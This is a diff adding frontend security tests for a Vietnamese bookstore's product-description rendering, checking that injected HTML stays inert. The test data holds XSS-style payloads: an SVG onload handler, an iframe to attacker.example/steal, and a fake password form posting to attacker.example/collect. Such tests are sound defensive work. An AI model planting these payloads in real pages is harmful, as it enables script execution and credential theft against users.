@@ -104,4 +104,45 @@ describe("ChiTietSanPham product description security", () => {
     expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
     expect(document.body.textContent).toContain(payload);
   });
+
+  it("renders an SVG payload as inert text, never as a live SVG node", async () => {
+    const payload = '<svg onload="window.__xss_script_executed = true"><circle r="10" /></svg>';
+    mockedGetBookById.mockResolvedValue(sachVoiMoTa(payload));
+    renderTrangChiTiet();
+
+    await screen.findByText(/Sách độc hại/);
+
+    expect(document.querySelector("svg")).toBeNull();
+    expect((window as any).__xss_script_executed).toBeUndefined();
+    expect(document.body.textContent).toContain(payload);
+  });
+
+  it("renders an iframe payload as inert text, never as an embedded frame", async () => {
+    const payload = '<iframe src="https://attacker.example/steal"></iframe>';
+    mockedGetBookById.mockResolvedValue(sachVoiMoTa(payload));
+    renderTrangChiTiet();
+
+    await screen.findByText(/Sách độc hại/);
+
+    expect(document.querySelector("iframe")).toBeNull();
+    expect(document.body.textContent).toContain(payload);
+  });
+
+  /**
+   * Mot form duoc chen vao trang that co the lua nguoi dung nhap thong tin dang nhap roi gui
+   * sang may chu khac — khong can chay javascript nao.
+   */
+  it("renders a form payload as inert text, never as a live form", async () => {
+    const payload =
+      '<form action="https://attacker.example/collect" method="post">' +
+      '<input name="matKhau" type="password" /><button>Đăng nhập</button></form>';
+    mockedGetBookById.mockResolvedValue(sachVoiMoTa(payload));
+    renderTrangChiTiet();
+
+    await screen.findByText(/Sách độc hại/);
+
+    expect(document.querySelector('form[action^="https://attacker"]')).toBeNull();
+    expect(document.querySelector('input[name="matKhau"]')).toBeNull();
+    expect(document.body.textContent).toContain(payload);
+  });
 });
